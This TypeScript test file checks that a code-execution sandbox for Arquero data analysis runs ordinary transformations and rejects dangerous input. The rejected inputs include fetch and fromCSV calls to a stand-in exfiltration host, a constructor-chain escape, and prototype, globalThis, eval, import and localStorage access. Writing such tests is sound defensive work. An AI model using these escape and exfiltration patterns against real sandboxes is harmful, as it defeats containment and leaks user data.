import { describe, it, expect } from 'vitest';
import * as aq from 'arquero';
import { createUserCodeExecutor } from './analyzerSandbox';
import { CodeExecutionError } from '../lib/errors';

describe('createUserCodeExecutor', () => {
  it('executes generated code and returns the result', () => {
    const executor = createUserCodeExecutor(new Map<string, unknown>());
    expect(executor('result = 1 + 1')).toBe(2);
  });

  it('executes Arquero transformations against preloaded tables', () => {
    const table = aq.from([
      { dept: 'Eng', salary: 100 },
      { dept: 'Sales', salary: 200 },
    ]);
    const executor = createUserCodeExecutor(new Map<string, unknown>([
      ['aq', aq],
      ['employees', table],
    ]));
    const out = executor("result = employees.filter(d => d.salary > 100)") as unknown[];
    expect(out).toHaveLength(1);
    expect(out[0]).toEqual({ dept: 'Sales', salary: 200 });
  });

  it('accesses column names with spaces via bracket notation', () => {
    const table = aq.from([{ 'col name': 5 }]);
    const executor = createUserCodeExecutor(new Map<string, unknown>([
      ['aq', aq],
      ['t', table],
    ]));
    const out = executor("result = t.array('col name')[0]") as unknown;
    expect(out).toBe(5);
  });

  it('rejects code referencing fetch with a typed retryable error', () => {
    const executor = createUserCodeExecutor(new Map<string, unknown>());
    let caught: unknown;
    try {
      executor("result = fetch('https://evil.example/exfil')");
    } catch (e) {
      caught = e;
    }
    expect(caught).toBeInstanceOf(CodeExecutionError);
    expect((caught as CodeExecutionError).message).toMatch(/forbidden/);
    expect((caught as CodeExecutionError).retryable).toBe(true);
  });

  it('rejects code referencing localStorage', () => {
    const executor = createUserCodeExecutor(new Map<string, unknown>());
    expect(() => executor("result = localStorage.getItem('key')")).toThrow(CodeExecutionError);
  });

  it('rejects constructor-chain escapes', () => {
    const executor = createUserCodeExecutor(new Map<string, unknown>());
    expect(() => executor("result = (() => {}).constructor.constructor('return 1')()")).toThrow(CodeExecutionError);
  });

  it('rejects prototype and global access', () => {
    const executor = createUserCodeExecutor(new Map<string, unknown>());
    expect(() => executor('result = d.__proto__')).toThrow(CodeExecutionError);
    expect(() => executor('result = globalThis')).toThrow(CodeExecutionError);
    expect(() => executor("result = eval('1')")).toThrow(CodeExecutionError);
    expect(() => executor("result = import('x')")).toThrow(CodeExecutionError);
  });

  it('rejects URL-based fromCSV through the exposed aq namespace', () => {
    const executor = createUserCodeExecutor(new Map<string, unknown>([['aq', aq]]));
    expect(() => executor("result = aq.fromCSV('https://evil.example/exfil')")).toThrow(CodeExecutionError);
  });

  it('allows column names containing scan-target words as substrings', () => {
    const table = aq.from([{ time_window: 3 }]);
    const executor = createUserCodeExecutor(new Map<string, unknown>([
      ['aq', aq],
      ['t', table],
    ]));
    const out = executor("result = t.array('time_window')[0]") as unknown;
    expect(out).toBe(3);
  });
});
